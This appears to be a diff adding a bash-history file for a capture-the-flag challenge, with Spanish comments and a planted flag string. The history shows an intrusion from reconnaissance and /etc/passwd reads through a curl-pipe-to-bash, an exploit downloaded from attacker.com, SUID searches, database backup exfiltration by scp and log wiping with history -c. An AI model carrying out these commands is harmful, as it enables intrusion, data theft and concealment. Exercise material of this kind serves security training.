@@ -1,0 +1,34 @@
+ls -la
+cd /home/user/
+cat .bash_history
+whoami
+uname -a
+ls /etc/
+cat /etc/passwd
+cd /var/www/html
+ls -R
+cat config.php
+# Error: Connection timeout
+ping 8.8.8.8 -c 4
+curl http://10.0.0.52/malware.sh | bash
+# Access Denied
+sudo -l
+# Intentando escalar privilegios...
+find / -perm -4000 -type f 2>/dev/null
+cd /tmp
+wget http://attacker.com/exploit.py
+python3 exploit.py
+# El exploit ha fallado. Reintentando con nuevas credenciales.
+ssh admin@internal-db.local -p 22
+# Password input: **********
+# Login exitoso.
+cd /db_backups
+ls
+tar -czvf backup_june.tar.gz /sql_data
+# Enviando datos al servidor remoto...
+scp backup_june.tar.gz dev@backup-server.com:/remote/path
+# ¡Maldición! Me equivoqué de comando y pegué la flag del sistema en el historial:
+echo "DEBUG_MODE_ENABLED: FLAG{bash_history_leaks_secrets_88}"
+rm -rf /tmp/exploit.py
+history -c
+exit
